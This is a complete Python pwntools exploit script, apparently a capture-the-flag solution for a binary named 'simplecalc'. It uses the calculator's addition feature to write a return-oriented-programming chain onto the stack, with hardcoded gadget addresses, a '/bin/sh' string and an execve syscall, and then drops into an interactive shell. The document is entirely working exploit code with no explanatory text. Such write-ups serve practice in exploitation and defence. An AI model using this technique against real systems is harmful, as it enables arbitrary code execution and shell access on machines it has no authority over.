#!/usr/bin/env python3

import pwn

io = pwn.process("./simplecalc")

io.recvuntil(b"calculations: ")
io.sendline(b"100")

# Establish our rop gadgets
popRax = 0x44DB34
popRdi = 0x401B73
popRsi = 0x401C87
popRdx = 0x437A85

# mov qword ptr [rax], rdx ; ret
movGadget = 0x44526E
syscall = 0x400488


def addSingle(x):
    io.recvuntil(b"=> ")
    io.sendline(b"1")
    io.recvuntil(b"Integer x: ")
    io.sendline(b"100")
    io.sendline(str(x - 100).encode())


def add(z):
    x = z & 0xFFFFFFFF
    y = (z & 0xFFFFFFFF00000000) >> 32
    addSingle(x)
    addSingle(y)


for i in range(9):
    add(0x0)

add(popRax)
add(0x6C1000)
add(popRdx)
add(0x0068732F6E69622F)
add(movGadget)
add(popRax)
add(0x3B)
add(popRdi)
add(0x6C1000)
add(popRsi)
add(0x0)
add(popRdx)
add(0x0)
add(syscall)

io.sendline(b"5")
io.interactive()
